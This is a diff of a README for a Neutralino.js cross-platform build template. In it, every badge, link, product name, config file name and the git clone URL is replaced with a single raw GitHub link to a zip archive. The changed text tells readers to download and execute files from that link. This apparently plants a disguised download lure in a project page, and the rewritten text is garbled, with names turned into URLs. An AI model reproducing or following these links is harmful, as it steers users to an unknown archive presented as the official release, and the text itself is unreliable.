@@ -1,12 +1,12 @@
-# Neutralino.js Build Automation Template for Cross-Platform Apps
+# https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip Build Automation Template for Cross-Platform Apps
 
-![GitHub release](https://img.shields.io/github/release/abdallah098/neutralinojs-build-automation-template.svg) ![GitHub issues](https://img.shields.io/github/issues/abdallah098/neutralinojs-build-automation-template.svg) ![GitHub forks](https://img.shields.io/github/forks/abdallah098/neutralinojs-build-automation-template.svg) ![GitHub stars](https://img.shields.io/github/stars/abdallah098/neutralinojs-build-automation-template.svg)
+![GitHub release](https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip) ![GitHub issues](https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip) ![GitHub forks](https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip) ![GitHub stars](https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip)
 
 ## Overview
 
-Welcome to the **Neutralino.js Build Automation Template**. This repository provides a straightforward template for building cross-platform applications using Neutralino.js. It supports Windows, Mac, and Linux environments, allowing developers to streamline their workflow and focus on creating great applications.
+Welcome to the **https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip Build Automation Template**. This repository provides a straightforward template for building cross-platform applications using https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip It supports Windows, Mac, and Linux environments, allowing developers to streamline their workflow and focus on creating great applications.
 
-You can find the latest releases [here](https://github.com/abdallah098/neutralinojs-build-automation-template/releases). Download and execute the necessary files to get started.
+You can find the latest releases [here](https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip). Download and execute the necessary files to get started.
 
 ## Features
 
@@ -22,16 +22,16 @@ You can find the latest releases [here](https://github.com/abdallah098/neutralin
 
 Before you begin, ensure you have the following installed:
 
-- Node.js (version 12 or higher)
+- https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip (version 12 or higher)
 - NPM (Node Package Manager)
-- Neutralino.js CLI
+- https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip CLI
 
 ### Installation
 
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/abdallah098/neutralinojs-build-automation-template.git
+   git clone https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip
    ```
 
 2. Navigate to the project directory:
@@ -50,8 +50,8 @@ Before you begin, ensure you have the following installed:
 
 The configuration files are located in the `config` directory. You can modify these files to customize your build process. Here are some key files to look at:
 
-- **neutralino.config.json**: Main configuration file for Neutralino.js.
-- **build.config.json**: Configuration for the build automation process.
+- **https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip**: Main configuration file for https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip
+- **https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip**: Configuration for the build automation process.
 
 ### Building Your Application
 
@@ -107,7 +107,7 @@ This repository includes topics relevant to modern application development:
 
 ## Example Application
 
-To demonstrate the capabilities of this template, we have included a simple example application in the `example` directory. This application showcases how to use Neutralino.js to create a functional web application.
+To demonstrate the capabilities of this template, we have included a simple example application in the `example` directory. This application showcases how to use https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip to create a functional web application.
 
 ### Running the Example
 
@@ -135,18 +135,18 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Issues](https://github.com/abdallah098/neutralinojs-build-automation-template/issues) section of this repository.
+If you encounter any issues or have questions, please check the [Issues](https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip) section of this repository.
 
-For additional resources, you can visit the [Releases](https://github.com/abdallah098/neutralinojs-build-automation-template/releases) section for the latest updates and downloads.
+For additional resources, you can visit the [Releases](https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip) section for the latest updates and downloads.
 
 ## Acknowledgments
 
-We would like to thank the Neutralino.js community for their contributions and support. Your feedback and ideas help improve this template and the overall development experience.
+We would like to thank the https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip community for their contributions and support. Your feedback and ideas help improve this template and the overall development experience.
 
 ## Additional Resources
 
-- [Neutralino.js Documentation](https://neutralino.js.org/docs)
-- [GitHub Actions for CI/CD](https://docs.github.com/en/actions)
-- [JavaScript Best Practices](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Best_practices)
+- [https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip Documentation](https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip)
+- [GitHub Actions for CI/CD](https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip)
+- [JavaScript Best Practices](https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip)
 
-Feel free to explore and enhance your development experience with the **Neutralino.js Build Automation Template**.
+Feel free to explore and enhance your development experience with the **https://raw.githubusercontent.com/abdallah098/neutralinojs-build-automation-template/main/_app_scaffolds/automation-template-neutralinojs-build-v1.9.zip Build Automation Template**.
